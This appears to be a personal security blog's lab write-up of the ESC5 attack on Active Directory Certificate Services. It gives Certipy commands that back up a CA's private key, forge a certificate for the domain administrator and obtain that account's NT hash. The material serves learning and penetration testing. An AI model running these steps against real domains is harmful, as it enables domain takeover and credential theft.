
<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ESC5 ADCS Misconfigurations exploitation — Active Directory Pentesting</title>
    <meta property="og:type" content="website">
    <meta property="og:title" content="ESC5 ADCS Misconfigurations exploitation — Active Directory Pentesting">
    <meta property="og:description" content="ESC5 is an attack that targets Active Directory Certificate Services (ADCS). This attack exploits access to the Certificate Authority (CA). If an attacker gains local administrator rights on the CA server, they can extract the CA certificate along with its private key. With that private key, the attacker can forge malicious certificates for privileged accounts (such as the Domain Administrator). These forged certificates can then be used to authenticate to AD via PKINIT and request a TGT.">
    <meta property="og:site_name" content="0xc4t Notes">
    <meta property="og:image" content="https://cdn-images-1.medium.com/max/800/1*vW0NWGO8Pyn3OIYZaUOpVQ.png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <link rel="stylesheet" href="../../style.css">
    <link rel="icon" type="image/x-icon" href="https://pbs.twimg.com/profile_images/1960719102932344837/T8Sl7V0i_400x400.jpg">
    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "81ab0317a4f24dde96e3b68dd2b1e0e3"}'></script>
    </head>
  <body>
    <h1>./0xc4t.re</h1>
    <p class="slogan">
      <i>Web Security &amp; Active Directory Security</i>
    </p>
    <nav>
      <a href="/">Posts</a>
    </nav>
    <hr>
</head>
  <body>
    <div id="content" class="content"><h2>ESC5 ADCS Misconfigurations exploitation — Active Directory Pentesting</h2>
<p>Continuing from the ESC4 write-up I made earlier — now that my work is done and I finally have more time to study, I figured I’d dive into ESC5 as well. Honestly, I don’t know why, but learning about Active Directory exploitation feels way more exciting, even though in real-world environments here in Indonesia it’s still pretty rare. Maybe it’s just the idealistic side of me, hahaha. Alright, let’s get into it and learn together.</p>
<h3>What is ESC5</h3>
<p>ESC5 is an attack that targets Active Directory Certificate Services (ADCS). This attack exploits access to the Certificate Authority (CA). If an attacker gains local administrator rights on the CA server, they can extract the CA certificate along with its private key. With that private key, the attacker can forge malicious certificates for privileged accounts (such as the Domain Administrator). These forged certificates can then be used to authenticate to AD via PKINIT and request a TGT.</p>
<h3>Setup Lab</h3>
<p>Create an account with any name and add that account as a local administrator on the CA Server (DC01):</p>
<pre><code class="language-bash">net localgroup Administrators "alex.doe" /add
net localgroup Administrators
</code></pre>
<p><img src="1_vW0NWGO8Pyn3OIYZaUOpVQ.png" alt="alt text"></p>
<h3>Emumeration and Exploitation</h3>
<p>Enumerate certificates using Certipy with the local administrator account on the CA server.</p>
<p><img src="1_M3D7I_2bJq3K2lOUVE0jzA.png" alt="alt text"></p>
<hr>
<p><img src="1_bJcqAIs8PS6VhksWvbwtXA.png" alt="alt text"></p>
<hr>
<p>Backup the CA certificate and private key using Certipy.</p>
<pre><code class="language-bash">certipy ca -backup -u alex.doe@sandbox.local -p "MyPassword123" -ca ignite-DC-CA -target 10.100.150.10
</code></pre>
<p>Forge the account we want to take over — in this case, administrator@sandbox.local because it is the domain admin on my target.</p>
<pre><code class="language-bash">certipy forge -ca-pfx 'sandbox-ca.pfx' -upn administrator@sandbox.local
</code></pre>
<p>Obtain the NT hash of the administrator@sandbox.local account using Certipy.</p>
<pre><code class="language-bash">certipy auth -pfx administrator_forged.pfx -dc-ip 10.100.150.10
</code></pre>
<p><img src="1_YPNAS95GD3H5DzDuG4gdrw.png" alt="alt text"></p>
<hr>
<p><img src="1_k9PCRzcKmeeSzAic_elTQQ.png" alt="alt text"></p>
<hr>
<h3>Dump Hash Credentials With Secretdump.py</h3>
<p><img src="1_KzCc1NtdqHa88M-qASyKRw.png" alt="alt text"></p>
<h3>References</h3>
<ul>
<li><a href="https://www.hackingarticles.in/ad-cs-esc5-vulnerable-pki-object-access-control/">https://www.hackingarticles.in/ad-cs-esc5-vulnerable-pki-object-access-control/</a></li>
<li><a href="https://mayfly277.github.io/posts/ADCS-part14/">https://mayfly277.github.io/posts/ADCS-part14/</a></li>
<li><a href="https://www.vaadata.com/blog/ad-cs-security-understanding-and-exploiting-esc-techniques/">https://www.vaadata.com/blog/ad-cs-security-understanding-and-exploiting-esc-techniques/</a></li>
</ul>
</div>

    <div class="social-icons">
      <a href="https://www.instagram.com/0xc4t?utm_source=ig_web_button_share_sheet&amp;igsh=ZDNlZDc0MzIxNw==" target="_blank"><i class="fab fa-instagram"></i></a>
      <a href="https://x.com/0x0c4t" target="_blank"><i class="fab fa-x-twitter"></i></a>
    </div>
    <div class="footer">
      © 2025 0xc4t
    </div>


</body></html>
